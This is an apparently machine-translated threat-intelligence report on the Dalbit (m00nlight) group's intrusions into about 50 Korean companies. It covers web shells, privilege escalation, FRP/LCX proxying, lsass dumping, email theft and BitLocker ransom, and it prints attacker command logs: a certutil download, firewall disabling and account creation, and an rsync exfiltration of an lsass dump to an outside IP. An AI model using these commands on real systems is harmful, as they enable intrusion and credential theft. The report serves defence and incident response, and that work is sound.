Dalbit (m00nlight): Chinese hacker group's APT attack campaign
kingkimgim ⋮ ⋮ 1/31/2023
0. Overview
The content is an extension of the 'Attack Group Using FRP (Fast Reverse Proxy) Targeting Domestic Companies'
blog, which was released on August 16, 2022, and tracks the group's actions.
Attack group using FRP (Fast Reverse Proxy) targeting Korean companies – ASEC BLOG

Forwarding 3.1. FRP3.2. HTran(LCX)4. Cases of Ransomware Infection (BitLocker) In recent years, domestic
companies have been frequently involved in security breaches in which an attacker infiltrates, starting with a
vulnerable server exposed to the outside, and takes control of the internal network. Cases of attack targeting
vulnerable Atlassian Confluence servers Meterpreter vulnerability distributed to vulnerable servers in domestic
medical institutions…
This group has been mainly using open source tools from the past until now and has lacked clear features of profiling
due to lack of information such as PDBs. In addition, the C2 (Command & Control) server abused the server of a
domestic company, and the information that could be collected was limited if the victim company did not request a
separate investigation. However, when the blog was released and some of the domestic corporate servers used by
the attacker were blocked, the attacker started using the hosting server named '*.m00nlight.top' as a C2 and
download server. Therefore, ASEC names this group Dalbit (m00nlight.top) from the English word 'Moonlight'
meaning 'moonlight'.
It has been confirmed that the group has attempted to attack more than 50 Korean companies from 2022 until now.
The companies that have been attacked so far mainly include small and medium-sized companies and some large
companies. In particular, it has been confirmed that 30% of the infected companies are using a specific groupware
solution in Korea. Currently, it is difficult to clearly know whether there is a vulnerability in the groupware product, but
if the server exposed to the outside is vulnerable like this, it can lead to leakage of internal secrets and ransomware,
which can have a great impact on the company. In addition, the Dalbit group sets some of the infected companies as
proxy and download servers, and is used as an attacker's link when infiltrating another company.
Therefore, if an attack by the Dalbit group is suspected, it seems necessary to conduct an in-house security check,
and we request that you report it to AhnLab so that we can preemptively respond to prevent potential secondary
damage and other corporate damage.
1. Domestic victimized companies (industry classification)
A total of 50 companies that have been identified as victims from 2022 to the present are as follows. Companies that
cannot be clearly identified are excluded from the list, and it is estimated that there are more affected companies.

2. Flow and Characteristics
2.1. summary
3/16
[Figure 2] Infringement Summary of Dalbit Group
The figure above shows the process by which an attacker compromises Company B. A brief introduction of the flow is
as follows.
1) Initial Access 

An attacker uses vulnerabilities in a web server or SQL server to gain access to the system
and then tries to control it using a tool such as a web shell.
2) 

Download several hacking tools through the Command & Control web shell. Hacking tools
include several binaries, including privilege escalation tools, proxy tools, and network
scanning tools.
3) Proxy & Internal Reconnaissance 

Proxy: The attacker installs a proxy tool such as FRP (Fast Reverse Proxy) and then 2-1)
the hosting server built by the attacker or 2-2) the server of another company (Company A)
that has been infected Attempts to connect to Remote Desktop (RDP) via 

Internal Reconnaissance: Internal reconnaissance and information acquisition through
network scan tools and account takeover tools.
4) Lateral Movement 

Moves to another server or PC that can be connected through the obtained information.
Afterwards, a proxy tool (FRP) is installed on the PC where the lateral movement has
succeeded to configure an environment where the attacker can access RDP, and the
necessary privileges are obtained by adding a specific account or using a credential
stealing tool such as Mimikatz.
5) Impact

Finally, if the attacker has stolen all the information he wants, he locks the specific drive
using BitLocker and demands money.

The attacker's own tool seems to be one tool that leaks e-mails, and the rest used normal Windows programs or tools
that can be easily obtained when searching.
3.2. infringement process
3.2.1. early penetration
The target of attack is presumed to be a server with specific groupware installed in Korea, a vulnerable web server,
mail server (Exchange Server), and SQL server. The attacker exploited WebLogic vulnerabilities such as CVE-2017-
10271 or file upload vulnerabilities to upload WebShell, and some appear to have used SQL Server's command
prompt (xp_cmdshell). 
The web shells used by the attackers were Godzilla, ASPXSpy, AntSword, and China Chopper in the order, and
Godzilla was used the most, and some other web shells were also identified.
The path of the installed web shell is as follows.

[Table 4] Path where web shell is uploaded
3.2.2. Download
The attacker downloads other hacking tools through the Windows normal programs installed by default. Since web
shell is usually used for infiltration, except for command processes such as cmd, parent processes are executed by
web server processes such as w3wp.exe, java.exe, sqlserver.exe, and tomcat*.exe. The downloaded files receive
files that the attacker needs, such as privilege elevation tools, proxy tools, and network scan tools. The download
command is as follows.
(For reference, in the case of a domestic corporate server that has been abused, the address is not fully disclosed.)
1) Certutil
> certutil -urlcache -split -f  hxxp://www.ive***.co[.]en/uploadfile/ufaceimage/1/update.zip

hxxp://91.217.139[.]117:8001/log.ini ” “c:\windows\debug\log.ini” (frpc.ini) 
…
[Table 6] Bitsadmin download log
Hacking tools and malicious codes downloaded by attackers were mainly identified in the following paths. 
%ALLUSERSPROFILE%
%SystemDrive%\temp 

%SystemDrive%\perflogs

%SystemDrive%\nia 

%SystemDrive%\.tmp
%SystemRoot%

%SystemRoot%\debug

%SystemRoot%\temp
[Table 7] Main directory used by Dalbit group
Therefore, if infringement is suspected, it is necessary to check the file in the corresponding path.
3.2.3. Elevate privileges and add accounts
Attackers mainly use Potato (BadPotato, JuicyPotato, SweetPotato, RottenPotato, EFSPotato) and POCs (CVE-
2018-8639, CVE-2019-1458) published on Github to escalate privileges. It is characterized by adding the following
account after elevation of authority.
The sp.exe below is the SweetPotato tool.
> sp.exe “whaomi” (check permissions) 

> sp.exe “netsh advfirewall set allprofiles state off” (firewall OFF) 

> sp.exe “net usermainff0.123456 /add & net localgroup administrators main /add” (add
account)
[Table 8] Logs using SweetPotato
The interesting part to look at is the account name added by the attacker. This is also confirmed by the attacker's
account 'main' in other infringing companies.
In addition to adding accounts, the attacker also used hijacked administrator accounts.
> wmic /node:127.0.0.1 /user:storadmin /password:r*****1234!@#$ process call create
“cmd.exe /cc:\temp\s.bat”
[Table 9] Administrator account execution log
3.2.4. proxy settings
After infiltrating the server, the attacker accesses it using a proxy to use RDP communication. FRP and LCX were
mainly used as proxy tools, and ReGeorg , NPS , or RSOCKS were also confirmed in some companies. In addition,
several proxy tools such as FRP and LCX were identified in one place in a specific infringing company, and multiple
FRP configuration files (. It is believed that when there are many prey among accessible PCs, the attacker
additionally installs FRP and uses a large number of configuration files. In addition, the LCX used by the group has
the same functions as the open source, but a binary arbitrarily compiled by a Chinese person was used, not a version
released on Github. 
There are differences in forwarding methods and protocols supported by proxy tools such as FRP and LCX. However,
since the TI report 'Attack Case Analysis Report Abusing Various Remote Control Tools ' explained the difference,
actual infection cases, and reproduced and network packets, this article does not mention that part separately. 
1) Fast Reverse Proxy (FRP)
When compromised by this group, FRP configuration files (.ini) were identified on both the server and PC device.
Below is an example of an actual breaching company.
[Figure 3] FRPC configuration file
(m00nlight.top) found in the infringing company
In particular, the Dalbit group mainly communicated using the Socks5 protocol. The Socks5 protocol is a 5th layer
protocol among the 7th layer of OSI, and it can handle various requests such as HTTP, FTP, and RDP as it is
7/16
between the 4th and 7th layers. Accordingly, if an attacker uses a proxy connection tool such as Proxifier that can
handle Socks5 on the attacker's server, remote control through RDP is possible, and if it is possible to connect to an
internal PC, lateral movement can also be performed. In other words, if you set the configuration file to the Socks5
protocol, you have more freedom because you can handle multiple requests without any further modification. 
[Figure 4] Example using Socks5
The following are FRP file names and commands used by the attacker. Listed below are the most used ones.
FRP file name
update.exe 

debug.exe 

main.exe

info.exe 

Agent.exe 

frpc.exe 

test.exe 

zabbix.exe

> cmd.exe /cc:\temp\****\temp\frpc.ini 

…
[Table 11] FRP execution log
In addition, certain companies maintained persistence by registering FRP in the task scheduler (schtasks) under the
name 'debug'. It was confirmed that the registered scheduler was executed as follows.
> schtasks /tn debug /run

2) LCX (Htran)
Dalbit used the LCX (Htran) binary compiled by a certain Chinese. This has the same function as the existing binary ,
but the nickname of the binary creator is specified.
[Figure 5] Running LCX used by Dalbit group (By 折羽鸿鹄)
The person who created the binary is identified as '折羽鸿鹄' (QQ:56345566). It is very unlikely that this author is an
attacker, but since this binary cannot be downloaded simply by searching, it is presumed that the attacker has ties to
China.
The installed file name and execution are as follows.
LCX file name
lcx3.exe 

lcx.exe 

update.exe
[Table 13] LCX file names
LCX command
> update.exe -slave 1.246.***.*** 110 127.0.0.1 3389 

> lcx3.exe -slave 222.239.***.*** 53 127.0.0.1 3389 

…
[Table 14] LCX command log
Since the LCX C2 above is a domestic company server, it is marked with masking.
3.2.5. internal reconnaissance
Fscan and NBTScan tools were commonly used for network scanning, and TCP Scan and Goon were identified in
some cases.
Goon is a network scanning tool made with Golang that can scan Tomcat, MSSQL, and MYSQL accounts as well as
basic port scans. You can also confirm that the tool is also made in Chinese.
[Figure 6] Screen when running Goon
9/16
3.2.6. stealing information
The main stealing information is LSASS Dump information and the EML file of a specific account. Depending on the
company, it has been confirmed that the program installed with the WMIC command is checked, or the screen image
is sent to the attacker's server at regular intervals from a specific victim's PC.
1) Extract credential information (LSASS Dump)
The attacker tried to extract credential information without installing Mimikatz according to the target. This is a method
of dumping the Lsass.exe process. Since this dump file contains credential information, tools such as Mimikatz or
Pypykatz can obtain the credential information of the PC. For reference, detailed information on Mimikatz can be
found in the TI report ' Analysis report on internal network propagation techniques using Mimikatz '.
The attacker's method of stealing credential information performed without Mimikatz is as follows.
1-1) Dumpert
Open source Dumpert is a tool that bypasses API hooking and performs according to the OS version. It dumps the
lsass.exe process using the MiniDumpWriteDump() API. The attacker modified the code to change the dump file path
and remove the log output function.
[Figure 7] Left (Dumpert open source) vs Right (Dumper used by Dalbit group)
In the picture above, in the case of the right side, you can see that the path and output string are the same except
that they have been removed.
All the paths of the dump files confirmed so far are '%SystemRoot%\temp' and are as follows.
%SystemRoot%\temp\duhgghmpert.dmp 

%SystemRoot%\temp\dumpert.dmp 

%SystemRoot%\temp\tarko.dmp 

%SystemRoot%\temp\lsa.txt 

…
[Table 15] Lsass dump file path
1-2) Procdump
The Procdump tool is a normal utility program provided by Microsoft that provides a process dump function. The
attacker performed the dump through the tool as follows.
[Figure 8] Output when executing Procdump
Afterwards, the attacker sent the dump file to the attacker's server through a tool called Rsync (Remote Sync). Below
is a real case of an attacker attempting to leak information.
> svchost.exe -accepteula -ma lsass.exe web_log.dmp 

> rsync -avz –port 443 web_log.zip test@205.185.122[.]95::share/web_log.zip
[Table 16] Procdump execution and logs using rsync
10/16
2) Extract mail
[Figure 9] Executing the Mail Extraction Tool
The sample is a mail extracting tool made with Golang, and is presumed to be the only tool made by an attacker. It
has a function of extracting mail from a specific account into an EML file through EWS (Exchange Web Service)
targeting the company's Exchange mail server. Factors include Exchange server address, account name, NTLM
password hash of the account, date and time, etc. When executed, all mails are extracted from all mailboxes of the
account based on the received time as a factor and saved as EML files.
For reference, the PDB information of the binary is 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', which is
meaningless.
[Figure 10] PDF information of mail extraction tool
3) Screen leak
The attacker transmitted the screen of a specific PC to the attacker's server. The binary that captures the current
screen has not been confirmed, but the attacker's server from which the screen of the infected PC is transmitted has
been identified. In this case, the screen of the infringing PC of a specific company was transmitted every 5 to 10
seconds.
Attacker's screen transmission server: hxxp://91.217.139[.]117:8080/1.bat
11/16
[Figure 11] Damaged PC screen of a specific company that was actually transmitted
It only transmitted images completely, could not be controlled remotely, and did not output audio.
In addition, the attacker's server (91.217.139[.]117) where the screen was being sent was also used as a download
server by another company.

4) Inquiry of installed programs and login information
The attacker checked the installed program through the WMIC command.

3.2.7. file encryption
This information was introduced in detail in a previous blog . The attacker encrypts a specific drive through BitLocker,
a Windows utility, and demands a ransom. Several more victims are currently being identified.

4. Conclusion
The Dalbit hacking group attempted to attack vulnerable servers of domestic companies, and logs are being
uploaded not only to mid-sized companies but also to some large companies. In particular, it was confirmed that 30%
of the damaged companies were using a specific groupware product in Korea. In addition, the group uses tools that
anyone can easily obtain, from the web shell used at the beginning of the intrusion to the final stage of ransomware.
There are also Chinese tools that are not available. Therefore, since the attacker mainly used tools introduced in
Chinese, it is estimated that there is some connection with China.
Server administrators should check the main download path, main account name ('main'), and IOC of the attacker
introduced in this article when suspicious of infection. see. In addition, if the server configuration environment is
vulnerable, administrators must patch to the latest version to prevent existing vulnerabilities in advance, and if there is
an unmanaged server among servers that are open to the outside, it seems necessary to check.

For reference, the ASEC blog does not disclose the IP of domestic corporate servers being exploited by attackers.
